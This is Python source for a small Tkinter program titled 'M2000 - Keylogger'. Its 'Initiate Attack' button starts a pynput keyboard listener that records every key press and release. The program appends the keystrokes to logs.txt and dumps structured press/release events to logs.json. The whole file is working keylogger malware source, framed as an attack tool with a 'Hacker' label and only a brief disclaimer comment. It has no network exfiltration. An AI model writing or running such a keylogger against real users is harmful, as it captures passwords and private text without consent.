import tkinter as tk
import json
from pynput import keyboard

class M2000:
    def __init__(self, root):
        self.root = root
        self.root.geometry("250x300")
        self.root.title("M2000 - Keylogger")
        self.root.resizable(True, True)

        # Change the default Tkinter icon to a custom icon
        self.root.iconbitmap('/icons/icon.ico')

        # Initialize variables to store key logs and key strokes status
        self.key_list = []
        self.key_strokes = ""
        self.x = False

        # Create GUI elements
        self.empty_label()  #  some space between GUI elements
        self.title_label()  #  label with the title of the keylogger
        self.start_button()  #  button to initiate the keylogging attack
        self.end_button()  #  button to end the keylogging attack and close the GUI
        self.hacker_label()  #  label to indicate the "Hacker" status (for demonstration purposes)

    def empty_label(self):
        # Add empty labels to create some space between GUI elements
        for _ in range(5):
            tk.Label(self.root, text=" ").pack()

    def title_label(self):
        # Add a label with the title of the keylogger
        tk.Label(self.root, text="M2000 - Keylogger", font='verdana 11 bold').pack()

    def update_txt_file(self, key):
        # Update the 'logs.txt' file with the captured key
        with open('logs.txt', 'a') as key_strokes_file:
            key_strokes_file.write(key)

    def update_json_file(self):
        # Update the 'logs.json' file with the captured key logs as a JSON object
        with open('logs.json', 'w') as key_log:
            json.dump(self.key_list, key_log)

    def on_press(self, key):
        # Callback function when a key is pressed
        if not self.x:
            self.key_list.append({'Pressed': str(key)})  # Append pressed key to the key_list
            self.x = True  # Set x to True to indicate that a key is currently pressed

    def on_release(self, key):
        # Callback function when a key is released
        self.key_list.append({'Released': str(key)})  # Append released key to the key_list
        if self.x:
            self.x = False  # Set x back to False to indicate no keys are pressed
            self.update_json_file()  # Update the 'logs.json' file with the captured key logs
            self.key_strokes += str(key)  # Append the key to the key_strokes variable
            self.update_txt_file(self.key_strokes)  # Update the 'logs.txt' file with the captured key strokes

    def initiate_attack(self):
        # Function to start capturing key logs
        print("[+] Initiating Attack!\n[!] Saving the key logs in 'logs.json'")
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def end_attack(self):
        # Function to end the keylogging attack and close the GUI
        self.root.quit()

    def start_button(self):
        # Add a button to initiate the keylogging attack
        tk.Button(self.root, text="Initiate Attack", command=self.initiate_attack, bg="white", fg="black").pack()

    def end_button(self):
        # Add a button to end the keylogging attack and close the GUI
        tk.Button(self.root, text="End Attack", command=self.end_attack, bg="white", fg="black").pack()

    def hacker_label(self):
        # Add a label to indicate the "Hacker" status (just for demonstration, not encouraging illegal activities)
        tk.Label(self.root, text="Hacker", font='verdana 8 bold').pack(anchor=tk.SE)

if __name__ == "__main__":
    root = tk.Tk()
    app = M2000(root)
    root.mainloop()
